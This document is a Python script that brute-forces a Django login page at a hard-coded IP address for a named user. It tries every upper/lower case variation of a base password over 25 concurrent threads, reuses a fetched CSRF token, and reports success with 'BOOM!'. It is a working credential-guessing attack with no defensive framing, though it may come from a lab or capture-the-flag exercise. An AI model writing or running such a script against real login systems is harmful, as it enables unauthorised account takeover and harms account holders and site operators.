import requests
import itertools
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURATION ---
LOGIN_URL = "http://209.38.254.85:8002/login/"
USERNAME = "alice_wonder"
BASE_PASSWORD = "MyS3cr3tP@ss!"
THREADS = 25  # Increased concurrency

# Global session to reuse TCP connections (faster)
s = requests.Session()

def get_csrf():
    """Fetch one CSRF token to reuse (Django often allows this per session)"""
    try:
        r = s.get(LOGIN_URL)
        return r.cookies.get('csrftoken')
    except:
        return None

def check_password(password, csrf_token):
    """Tries a single password. Returns True if successful."""
    payload = {
        'csrfmiddlewaretoken': csrf_token,
        'username': USERNAME,
        'password': password
    }
    # Important: Referer is required for Django CSRF
    headers = {'Referer': LOGIN_URL}
    
    try:
        # Use the global session 's' if possible, or a new request
        r = s.post(LOGIN_URL, data=payload, headers=headers, timeout=5)
        
        # If we DON'T see "Invalid credentials", we likely got in.
        if "Invalid credentials" not in r.text and r.status_code == 200:
            return password
    except:
        pass
    return None

def main():
    # 1. Generate all case variations
    chars = list(BASE_PASSWORD)
    indices = [i for i, c in enumerate(chars) if c.isalpha()]
    total_combos = 2**len(indices)
    
    print(f"[*] Base Password: {BASE_PASSWORD}")
    print(f"[*] Variations: {total_combos}")
    print(f"[*] Threads: {THREADS}")
    
    # Pre-fetch a CSRF token
    csrf = get_csrf()
    if not csrf:
        print("[-] Failed to get CSRF token. Check connection.")
        return

    # 2. Build the list of passwords to try
    passwords_to_try = []
    for bits in itertools.product([0, 1], repeat=len(indices)):
        candidate = list(chars)
        for i, bit in enumerate(bits):
            if bit == 0:
                candidate[indices[i]] = candidate[indices[i]].lower()
            else:
                candidate[indices[i]] = candidate[indices[i]].upper()
        passwords_to_try.append("".join(candidate))

    # 3. Fire up the threads
    print("[*] Starting Turbo Attack...")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # Submit all tasks
        future_to_pass = {executor.submit(check_password, p, csrf): p for p in passwords_to_try}
        
        for future in as_completed(future_to_pass):
            result = future.result()
            if result:
                print(f"\n\n[+] 🚀 BOOM! Found correct password: {result}")
                print(f"[+] Login here: {LOGIN_URL}")
                # Cancel remaining tasks (shutdown hard)
                executor.shutdown(wait=False)
                sys.exit(0)
            
            # Simple progress indicator
            sys.stdout.write(".")
            sys.stdout.flush()

    print("\n[-] Attack finished. No password worked.")

if __name__ == "__main__":
    main()